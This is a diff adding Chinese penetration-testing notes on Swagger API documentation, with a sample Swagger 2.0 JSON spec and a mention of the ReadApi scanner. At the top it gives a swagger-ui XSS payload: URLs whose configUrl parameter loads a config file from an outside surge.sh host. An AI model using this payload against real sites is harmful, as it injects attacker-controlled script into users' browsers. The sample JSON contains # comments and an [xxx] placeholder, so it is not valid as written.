@@ -1,0 +1,97 @@
+## Swagger接口TIPS
+
+
+  - swagger-ui界面的xss
+
+    ```http
+    swagger-ui/index.html?configUrl=https://jumpy-floor.surge.sh/test.json
+    swagger-ui.html?configUrl=https://jumpy-floor.surge.sh/test.json
+    ```
+
+  - 接口文档可能不止一个--`swagger-resources`
+
+    ![image-20230905205724346](../../../../../../知识库/blog/source/images/image-20230905205724346.png)
+
+- 只有接口文档，没有swagger-ui
+
+  将接口文档导入浏览器插件swagger-ui
+
+- 接口文档内容问题
+
+  ```
+  host为内网ip
+  basePath错误
+  schemes错误，如网站使用https，接口文档使用http
+  接口文档没有鉴权的header头
+  ```
+
+  swagger接口文档示例
+
+  ```json
+  {
+    "swagger": "2.0",
+    "info": {
+      "title": "接口文档标题",
+      "version": "1.0.0"
+    },
+    "host": "api.example.com",
+    "basePath": "/v1",
+    "schemes": ["https",
+                "http"],
+    "securityDefinitions": { 
+         "bearerAuth": { 
+             "type": "apiKey", 
+             "name": "Authorization", # name要看实际的鉴权头
+             "in": "header"
+         }
+     },
+    "security": [
+        {
+            "bearerAuth": [xxx]  # xxx为鉴权数据
+        }
+    ],
+    "paths": {
+      "/users": {
+        "get": {
+          "summary": "获取用户列表",
+          "description": "用于获取所有用户的列表信息",
+          "responses": {
+            "200": {
+              "description": "成功响应"
+            }
+          }
+        }
+      }
+    },
+    "definitions": {
+      "User": {
+        "type": "object",
+        "properties": {
+          "id": {
+            "type": "integer",
+            "format": "int64"
+          },
+          "name": {
+            "type": "string"
+          }
+        }
+      }
+    }
+  }
+  ```
+
+  
+
+  
+
+  
+
+## ReadApi使用
+
+![image-20230829114309049](../../../../../../知识库/blog/source/images/image-20230829114309049.png)
+
+扫描完成后，会生成PDF报告
+
+![image-20230829114529740](../../../../../../知识库/blog/source/images/image-20230829114529740.png)
+
+![image-20230829114701973](../../../images/image-20230829114701973-1734506288744-1.png)
